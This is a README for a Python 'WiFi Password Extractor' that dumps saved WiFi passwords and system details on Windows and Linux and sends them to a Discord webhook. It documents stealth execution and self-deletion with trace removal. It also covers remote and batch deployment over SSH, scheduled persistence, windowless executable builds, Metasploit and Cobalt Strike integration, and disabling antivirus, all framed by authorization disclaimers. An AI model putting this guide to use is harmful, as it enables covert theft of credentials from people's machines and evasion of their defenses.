# WiFi-Password-Extractor v2.0 - Professional Security Assessment Tool

**Advanced WiFi credential extraction utility designed for authorized security testing, penetration testing, and red team operations.**

## Table of Contents

1. [Overview](#overview)
2. [Features](#features)
3. [Security Features](#security-features)
4. [Installation](#installation)
5. [Configuration](#configuration)
6. [Usage](#usage)
7. [Technical Details](#technical-details)
8. [Security Considerations](#security-considerations)
9. [Legal and Ethical Use](#legal-and-ethical-use)
10. [Troubleshooting](#troubleshooting)
11. [Building Executables](#building-executables)
12. [Project Structure](#project-structure)
13. [Contributing](#contributing)
14. [Disclaimer](#disclaimer)

## Overview

The WiFi-Password-Extractor v2.0 is a professional-grade security assessment tool designed for cybersecurity professionals, penetration testers, and red team operators. This tool provides comprehensive WiFi credential extraction capabilities across multiple operating systems while maintaining high security standards and professional execution.

### Purpose
- **Security Testing**: Authorized penetration testing and vulnerability assessment
- **Red Team Operations**: Professional security operations and assessments
- **Educational Research**: Security research and academic study
- **Network Auditing**: WiFi security evaluation and analysis

### Target Audience
- Cybersecurity professionals
- Penetration testers
- Red team operators
- Security researchers
- Ethical hackers
- Network security analysts

## Features

### Core Functionality
- **WiFi Password Extraction**: Comprehensive credential collection from Windows and Linux systems
- **Cross-Platform Support**: Native compatibility with Windows 7/8/10/11 and Linux distributions
- **Discord Integration**: Secure data transmission via webhook channels
- **Stealth Execution**: Silent operation with minimal system footprint
- **Automatic Cleanup**: Self-destruction and trace removal after execution

### Advanced Capabilities
- **System Information Gathering**: Comprehensive system metadata collection
- **Network Profile Analysis**: Detailed WiFi network configuration extraction
- **Security Key Retrieval**: Access to stored WiFi passwords and security keys
- **Permission Handling**: Graceful handling of access restrictions and user privileges
- **Error Recovery**: Robust error handling and graceful failure modes

### Professional Features
- **Input Validation**: Comprehensive data sanitization and validation
- **Resource Management**: Controlled memory and CPU usage
- **Timeout Protection**: Operation timeouts to prevent hanging processes
- **Secure Communication**: HTTPS-only data transmission with proper headers
- **Audit Trail**: Detailed logging and execution tracking

## Security Features

### Input Validation and Sanitization
- **Profile Name Limits**: Maximum 100 characters for WiFi profile names
- **Profile Count Limits**: Maximum 50 WiFi profiles per execution
- **Data Type Validation**: Strict type checking for all input parameters
- **Length Restrictions**: Comprehensive length validation for all data fields
- **Character Filtering**: Removal of potentially dangerous characters

### Resource Protection
- **Memory Limits**: Controlled memory allocation and usage
- **CPU Protection**: Process timeout and resource limits
- **File System Security**: Secure temporary file handling
- **Network Security**: Request timeout and connection limits
- **Process Isolation**: Isolated execution environment

### Error Handling and Security
- **Graceful Failures**: Error handling without information disclosure
- **Secure Cleanup**: Proper file deletion and trace removal
- **Exception Management**: Comprehensive exception handling
- **Data Protection**: No sensitive data leakage in error messages
- **Audit Logging**: Secure logging without sensitive information

## Installation

### System Requirements

#### Minimum Requirements
- **Operating System**: Windows 7/8/10/11 or Linux (Ubuntu 18.04+, CentOS 7+)
- **Python Version**: Python 3.7 or higher
- **Memory**: 512 MB RAM minimum
- **Storage**: 100 MB available disk space
- **Network**: Internet connection for Discord webhook

#### Recommended Requirements
- **Operating System**: Windows 10/11 or Linux (Ubuntu 20.04+, CentOS 8+)
- **Python Version**: Python 3.9 or higher
- **Memory**: 2 GB RAM or higher
- **Storage**: 500 MB available disk space
- **Network**: Stable broadband internet connection

### Python Installation

#### Windows
```bash
# Download Python from python.org
# Install with "Add to PATH" option enabled
# Verify installation
python --version
pip --version
```

#### Linux
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install python3 python3-pip

# CentOS/RHEL
sudo yum install python3 python3-pip

# Verify installation
python3 --version
pip3 --version
```

### Dependencies Installation

#### Automatic Installation
```bash
# Install all required dependencies
pip install -r requirements.txt
```

#### Manual Installation
```bash
# Install core dependencies
pip install requests>=2.28.0
pip install psutil>=5.9.0

# Verify installations
python -c "import requests, psutil; print('Dependencies installed successfully')"
```

#### Virtual Environment (Recommended)
```bash
# Create virtual environment
python -m venv wifi_extractor_env

# Activate virtual environment
# Windows
wifi_extractor_env\Scripts\activate

# Linux/Mac
source wifi_extractor_env/bin/activate

# Install dependencies
pip install -r requirements.txt
```

## Configuration

### Discord Webhook Setup

#### Step 1: Create Discord Server
1. Open Discord application or web interface
2. Create a new server or use existing server
3. Ensure you have administrator or manage webhooks permission

#### Step 2: Create Webhook
1. Go to Server Settings > Integrations > Webhooks
2. Click "New Webhook"
3. Configure webhook settings:
   - **Name**: WiFi Extractor Bot
   - **Channel**: Select appropriate channel
   - **Avatar**: Optional custom avatar
4. Click "Copy Webhook URL"

#### Step 3: Update Configuration
1. Open `main.py` file
2. Locate the `WEBHOOK_URL` variable
3. Replace with your webhook URL:
```python
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
```

### Security Configuration

#### Basic Settings
```python
# Core security settings
STEALTH_MODE = True      # Enable stealth features
SELF_DESTRUCT = True     # Auto-cleanup after execution
RANDOM_DELAY = True      # Random execution delays
```

#### Advanced Settings
```python
# Advanced security configuration
MAX_TIMEOUT = 30         # Maximum operation timeout (seconds)
MAX_PROFILES = 50        # Maximum WiFi profiles to extract
RANDOM_DELAY_MIN = 1     # Minimum delay before execution (seconds)
RANDOM_DELAY_MAX = 3     # Maximum delay before execution (seconds)
```

#### Customization Options
```python
# Customization settings
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
REQUEST_TIMEOUT = 30     # HTTP request timeout (seconds)
MAX_RETRIES = 3          # Maximum retry attempts for failed operations
```

## Usage

### Basic Execution

#### Command Line Usage
```bash
# Basic execution
python main.py

# With verbose output (if debug mode enabled)
python main.py --verbose

# With custom configuration
python main.py --config custom_config.json
```

#### Execution Modes

##### Stealth Mode (Default)
- Silent execution with no console output
- Automatic cleanup and trace removal
- Professional operation suitable for production use

##### Debug Mode
```python
# Enable debug mode in main.py
STEALTH_MODE = False
DEBUG_MODE = True
```

##### Verbose Mode
- Detailed execution logging
- Progress indicators and status updates
- Error details and debugging information


### Direct Execution Method

#### Local Execution
1. Copy script to target system
2. Ensure Python and dependencies are installed
3. Run script with appropriate permissions
4. Monitor Discord channel for results

#### Remote Execution
1. Upload script to target system via SSH/SMB
2. Execute remotely using SSH or remote management tools
3. Monitor Discord channel for results
4. Clean up script after execution

### Advanced Usage Scenarios

#### Batch Processing
```bash
# Execute on multiple systems
for system in system1 system2 system3; do
    ssh user@$system "python main.py"
done
```

#### Scheduled Execution
```bash
# Windows Task Scheduler
schtasks /create /tn "WiFi Audit" /tr "python main.py" /sc daily /st 09:00

# Linux Cron
0 9 * * * /usr/bin/python3 /path/to/main.py
```

#### Integration with Other Tools
- **Metasploit**: Execute as payload or post-exploitation module
- **Cobalt Strike**: Integrate with beacon or post-exploitation tools
- **Custom Scripts**: Use as component in larger security frameworks

## Technical Details

### Windows Implementation

#### WiFi Profile Extraction
```bash
# Command used for profile listing
netsh wlan show profile

# Command used for password extraction
netsh wlan show profile "PROFILE_NAME" key=clear
```

#### Data Parsing
- **Profile Detection**: Regex pattern matching for profile names
- **Password Extraction**: Line-by-line parsing for security keys
- **Status Determination**: Profile availability and access status
- **Error Handling**: Graceful handling of permission restrictions

#### System Information Collection
- **OS Details**: Windows version and build information
- **Hardware Info**: Processor architecture and system specifications
- **User Context**: Username, hostname, and working directory
- **Network Status**: WiFi adapter status and configuration

### Linux Implementation

#### NetworkManager Integration
- **Connection Files**: `/etc/NetworkManager/system-connections/`
- **File Format**: `.nmconnection` files with INI-style configuration
- **Password Storage**: Encrypted or plaintext password storage
- **Access Control**: File permissions and user access restrictions

#### Data Extraction Process
1. **Directory Scanning**: Enumerate connection files
2. **File Parsing**: Parse INI-style configuration files
3. **Password Retrieval**: Extract stored passwords and security keys
4. **Metadata Collection**: Gather connection details and settings

#### Cross-Distribution Compatibility
- **Ubuntu/Debian**: Native NetworkManager support
- **CentOS/RHEL**: NetworkManager and legacy network support
- **Arch Linux**: NetworkManager and systemd-networkd support
- **Custom Distributions**: Generic file-based approach

### Discord Integration

#### Webhook Communication
- **HTTPS Protocol**: Secure communication over TLS
- **Authentication**: Webhook token-based authentication
- **Rate Limiting**: Respect Discord API rate limits
- **Error Handling**: Graceful handling of network failures

#### Data Formatting
- **Rich Embeds**: Structured data presentation
- **Field Organization**: Logical grouping of information
- **Character Limits**: Respect Discord message limits
- **Formatting**: Markdown and formatting support

#### Security Measures
- **Data Validation**: Input sanitization and validation
- **Size Limits**: Message size and field length restrictions
- **Error Concealment**: No sensitive information in error messages
- **Secure Headers**: Proper User-Agent and request headers

## Security Considerations

### Input Validation and Sanitization

#### Profile Name Validation
```python
# Length validation
if profile_name and len(profile_name) < 100:
    profiles.append(profile_name)

# Character validation
import re
if re.match(r'^[a-zA-Z0-9\s\-_\.]+$', profile_name):
    profiles.append(profile_name)
```

#### Data Type Validation
- **String Validation**: Ensure all inputs are strings
- **Length Restrictions**: Enforce maximum length limits
- **Character Filtering**: Remove dangerous characters
- **Format Validation**: Validate data formats and structures

#### Resource Limits
- **Memory Limits**: Control memory allocation and usage
- **CPU Limits**: Process timeout and resource restrictions
- **File Limits**: Maximum file size and count restrictions
- **Network Limits**: Request timeout and connection limits

### Network Security

#### HTTPS Communication
- **TLS Encryption**: All communications over HTTPS
- **Certificate Validation**: Proper SSL certificate verification
- **Protocol Security**: Use of secure protocols only
- **Header Security**: Secure request headers and user agents

#### Request Security
- **Timeout Protection**: Request timeout limits
- **Retry Logic**: Controlled retry attempts
- **Error Handling**: Secure error message handling
- **Rate Limiting**: Respect API rate limits

### File System Security

#### Temporary File Handling
- **Secure Creation**: Random filename generation
- **Access Control**: Proper file permissions
- **Secure Deletion**: Complete file removal
- **Path Validation**: Secure path handling

#### Cleanup Procedures
- **File Removal**: Complete deletion of temporary files
- **Trace Elimination**: Removal of execution traces
- **Self-Destruction**: Script self-removal after execution
- **Log Cleanup**: Removal of execution logs

## Legal and Ethical Use

### Authorized Testing Only

#### Permission Requirements
- **System Ownership**: Only test systems you own
- **Explicit Permission**: Written permission from system owner
- **Scope Definition**: Clearly defined testing scope
- **Time Limitations**: Specified testing timeframes

#### Professional Context
- **Security Assessments**: Authorized penetration testing
- **Red Team Operations**: Professional security operations
- **Educational Research**: Academic security research
- **Compliance Testing**: Regulatory compliance assessments

### Responsible Disclosure

#### Vulnerability Reporting
- **Timely Reporting**: Report vulnerabilities promptly
- **Proper Channels**: Use appropriate reporting channels
- **Detailed Information**: Provide comprehensive vulnerability details
- **Coordination**: Coordinate with affected parties

#### Ethical Guidelines
- **No Harm**: Ensure no damage to systems or data
- **Privacy Protection**: Protect sensitive information
- **Professional Conduct**: Maintain professional standards
- **Legal Compliance**: Follow all applicable laws

### Compliance Requirements

#### Legal Framework
- **Local Laws**: Comply with local jurisdiction laws
- **Industry Regulations**: Follow industry-specific regulations
- **Data Protection**: Comply with data protection laws
- **Privacy Laws**: Respect privacy and confidentiality laws

#### Professional Standards
- **Industry Best Practices**: Follow security industry standards
- **Code of Ethics**: Adhere to professional codes of conduct
- **Certification Requirements**: Meet certification standards
- **Continuing Education**: Maintain current knowledge

## Troubleshooting

### Common Issues and Solutions

#### Discord Webhook Problems

##### Issue: Webhook Not Working
**Symptoms**: No data received in Discord channel
**Causes**: Invalid webhook URL, expired token, insufficient permissions
**Solutions**:
1. Verify webhook URL is correct and complete
2. Check webhook token hasn't expired
3. Ensure webhook has send message permissions
4. Test webhook with simple message first

##### Issue: Rate Limiting
**Symptoms**: Some messages not delivered
**Causes**: Discord API rate limits exceeded
**Solutions**:
1. Implement delay between requests
2. Reduce message frequency
3. Use multiple webhooks for high-volume operations
4. Monitor Discord API status

#### Permission and Access Issues

##### Issue: Permission Denied Errors
**Symptoms**: "Access Denied" for WiFi profiles
**Causes**: Insufficient user privileges, security policies
**Solutions**:
1. Run script with administrator privileges
2. Check Windows security settings
3. Verify user account permissions
4. Disable antivirus temporarily for testing

##### Issue: No WiFi Data Extracted
**Symptoms**: Empty results or no WiFi profiles found
**Causes**: WiFi disabled, no saved networks, permission restrictions
**Solutions**:
1. Ensure WiFi is enabled on target system
2. Check for saved WiFi networks
3. Verify network adapter status
4. Run as administrator if needed

#### System Compatibility Issues

##### Issue: Script Not Running
**Symptoms**: Python errors or script failures
**Causes**: Missing dependencies, Python version incompatibility
**Solutions**:
1. Install required dependencies
2. Verify Python version compatibility
3. Check system architecture support
4. Install missing system libraries

##### Issue: Partial Data Extraction
**Symptoms**: Some WiFi profiles missing or incomplete
**Causes**: Permission restrictions, corrupted profiles, system policies
**Solutions**:
1. Run with elevated privileges
2. Check system security policies
3. Verify WiFi service status
4. Check for profile corruption

### Debug and Diagnostic Tools

#### Debug Mode
```python
# Enable debug mode in main.py
STEALTH_MODE = False
DEBUG_MODE = True
VERBOSE_LOGGING = True
```

#### Logging and Monitoring
```python
# Add logging to main.py
import logging

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='wifi_extractor.log'
)
```

#### Error Reporting
```python
# Enhanced error handling
try:
    # Operation code
    pass
except Exception as e:
    logging.error(f"Operation failed: {str(e)}")
    # Continue with fallback or cleanup
```

### Performance Optimization

#### Memory Management
```python
# Optimize memory usage
import gc

def cleanup_memory():
    gc.collect()
    # Additional cleanup code
```

#### Network Optimization
```python
# Optimize network requests
session = requests.Session()
session.headers.update({
    'Connection': 'keep-alive',
    'Accept-Encoding': 'gzip, deflate'
})
```

## Building Executables

### PyInstaller Method

#### Installation
```bash
# Install PyInstaller
pip install pyinstaller

# Verify installation
pyinstaller --version
```

#### Basic Build
```bash
# Simple executable build
pyinstaller --onefile main.py

# Build with console window
pyinstaller --onefile --console main.py

# Build without console window
pyinstaller --onefile --windowed main.py
```

#### Advanced Build Options
```bash
# Optimized build
pyinstaller --onefile --optimize=2 --strip main.py

# Custom icon
pyinstaller --onefile --icon=icon.ico main.py

# Exclude unnecessary modules
pyinstaller --onefile --exclude-module matplotlib --exclude-module numpy main.py
```

### cx_Freeze Method

#### Installation
```bash
# Install cx_Freeze
pip install cx_Freeze

# Verify installation
python -c "import cx_Freeze; print('cx_Freeze installed')"
```

#### Setup Configuration
```python
# setup.py for cx_Freeze
from cx_Freeze import setup, Executable

executables = [
    Executable("main.py", base="Win32GUI", target_name="WiFiExtractor.exe")
]

setup(
    name="WiFi Password Extractor",
    version="2.0",
    description="WiFi Password Extraction Tool",
    executables=executables
)
```

#### Build Process
```bash
# Build executable
python setup.py build

# Build installer
python setup.py bdist_msi
```

### Auto-py-to-exe (GUI Method)

#### Installation
```bash
# Install auto-py-to-exe
pip install auto-py-to-exe

# Launch GUI
auto-py-to-exe
```

#### GUI Configuration
1. **Script Location**: Select main.py file
2. **Onefile/One Directory**: Choose packaging method
3. **Console Window**: Select console behavior
4. **Icon**: Add custom icon if desired
5. **Additional Files**: Include required resources
6. **Advanced Options**: Configure advanced settings

### Build Verification

#### Testing Executables
```bash
# Test basic functionality
./WiFiExtractor.exe

# Test with different parameters
./WiFiExtractor.exe --help

# Verify file size and properties
ls -la WiFiExtractor.exe
```

#### Distribution Preparation
1. **Test on Target Systems**: Verify compatibility
2. **Check Dependencies**: Ensure all required files included
3. **Verify Functionality**: Test all features work correctly
4. **Package Resources**: Include necessary configuration files

## Project Structure

### File Organization
```
WiFi-Password-Extractor/
├── main.py                    # Main WiFi extraction script
├── requirements.txt           # Python dependencies
├── README.md                  # This comprehensive documentation
├── setup.py                  # Build configuration (optional)
├── build/                    # Build output directory (generated)
├── dist/                     # Distribution directory (generated)
└── docs/                     # Additional documentation (optional)
```

### Code Architecture

#### Main Components
- **WiFiStealer Class**: Core functionality and logic
- **Configuration Section**: Settings and parameters
- **Utility Functions**: Helper methods and utilities
- **Main Execution**: Entry point and orchestration

#### Module Dependencies
```python
# Core system modules
import os, sys, platform, subprocess

# Network and communication
import requests, json

# Security and utilities
import time, random, string, hashlib

# System monitoring
import psutil
from datetime import datetime
```

### Configuration Management

#### Environment Variables
```bash
# Set configuration via environment variables
export WEBHOOK_URL="your_webhook_url"
export STEALTH_MODE="true"
export MAX_TIMEOUT="30"
```

#### Configuration Files
```json
// config.json
{
    "webhook_url": "your_webhook_url",
    "stealth_mode": true,
    "max_timeout": 30,
    "max_profiles": 50
}
```

## Contributing

### Development Guidelines

#### Code Standards
- **Python PEP 8**: Follow Python style guidelines
- **Documentation**: Comprehensive docstrings and comments
- **Error Handling**: Proper exception handling and logging
- **Testing**: Unit tests for all functionality

#### Security Requirements
- **Input Validation**: Validate all user inputs
- **Error Handling**: Secure error messages
- **Resource Management**: Proper resource cleanup
- **Audit Logging**: Comprehensive security logging

### Contribution Areas

#### Security Improvements
- **Vulnerability Fixes**: Security bug fixes and patches
- **Input Validation**: Enhanced input sanitization
- **Error Handling**: Improved error handling and logging
- **Resource Protection**: Better resource management

#### Feature Enhancements
- **New Platforms**: Support for additional operating systems
- **Enhanced Extraction**: Improved WiFi data extraction
- **Integration**: Better integration with security tools
- **Reporting**: Enhanced reporting and data presentation

#### Documentation Updates
- **User Guides**: Improved user documentation
- **API Documentation**: Better code documentation
- **Examples**: More usage examples and scenarios
- **Troubleshooting**: Enhanced troubleshooting guides

### Development Setup

#### Local Development Environment
```bash
# Clone repository
git clone https://github.com/Kumarabhijeet1608/WiFi-Password-Extractor-.git

# Create virtual environment
python -m venv dev_env

# Activate environment
source dev_env/bin/activate  # Linux/Mac
dev_env\Scripts\activate     # Windows

# Install development dependencies
pip install -r requirements-dev.txt
```

#### Testing Framework
```python
# Example test structure
import unittest

class TestWiFiExtractor(unittest.TestCase):
    def test_profile_extraction(self):
        # Test profile extraction functionality
        pass
    
    def test_discord_integration(self):
        # Test Discord webhook integration
        pass
```

## Disclaimer

### Legal Notice

**This tool is provided for educational and authorized security testing purposes only. The authors are not responsible for any misuse or damage caused by this software. Always ensure you have proper authorization before testing on any system.**

### Usage Restrictions

#### Prohibited Uses
- **Unauthorized Access**: Never use without explicit permission
- **Malicious Activities**: Do not use for harmful purposes
- **Privacy Violations**: Do not violate privacy rights
- **Illegal Operations**: Do not use for illegal activities

#### Responsible Use
- **Authorized Testing**: Only use with proper authorization
- **Educational Purposes**: Use for learning and research
- **Professional Context**: Use in professional security testing
- **Legal Compliance**: Follow all applicable laws and regulations

### Liability Limitations

#### No Warranty
- **As-Is Basis**: Software provided without warranties
- **No Guarantees**: No guarantees of functionality or security
- **Use at Own Risk**: Users assume all risks of use
- **No Support**: No official support or maintenance

#### User Responsibility
- **Proper Authorization**: Users must obtain proper authorization
- **Legal Compliance**: Users must comply with applicable laws
- **Ethical Use**: Users must use ethically and responsibly
- **Risk Assessment**: Users must assess and manage risks

## License

### License Terms

This project is provided as-is for educational purposes. Use responsibly and legally.

#### Permitted Uses
- **Educational**: Learning and academic research
- **Professional**: Authorized security testing
- **Research**: Security research and development
- **Personal**: Personal learning and development

#### Restrictions
- **Commercial Use**: No commercial use without permission
- **Redistribution**: No redistribution without permission
- **Modification**: No modification without permission
- **Derivative Works**: No derivative works without permission

### Copyright Notice

Copyright (c) 2024 Kumarabhijeet1608. All rights reserved.

---

**Use this tool responsibly and only for authorized security testing purposes. Always obtain proper authorization before testing on any system. Follow responsible disclosure practices and comply with all applicable laws and regulations.**

**For questions, support, or contributions, please refer to the project documentation or contact the development team through appropriate channels.**
